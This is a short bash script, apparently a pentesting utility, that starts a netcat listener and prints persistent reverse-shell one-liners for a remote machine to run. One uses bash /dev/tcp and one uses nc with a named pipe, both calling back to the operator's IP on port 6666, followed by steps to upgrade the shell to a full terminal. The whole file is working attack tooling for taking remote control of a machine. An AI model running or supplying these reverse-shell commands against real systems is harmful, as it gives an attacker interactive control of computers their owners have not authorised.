#!/usr/bin/env bash
#
# This is the small script to create back connect to your own host
#

HOST=$1 # OR XX.XX.XX.XX 
PORT=6666

if [[ -z $HOST ]]; then
    echo "USAGE: ./backconnect.sh YOUR_IP"
    exit
fi

echo "Remote:
    while true; do sh -i >& /dev/tcp/$HOST/$PORT 0>&1 ;sleep 1; done
or
    while true; do mkfifo temp; nc $HOST $PORT <temp 2>&1 | sh -i >temp 2>&1 ;rm temp; sleep 1; done
    "

CMD="stty -icanon -echo; ncat -lvp $PORT; stty -raw echo"

while true; do
echo "Started\$ $CMD
Then copy&paste:
    script /dev/null
    stty" $(stty -a |head -1 |awk '{print "rows", $5, "cols", $7}' |sed -e 's/;//g')
echo "    reset; clear; stty -a # Optional commands
    CTRL+D CTRL+C to break"

sh -c "$CMD"
sleep 1
done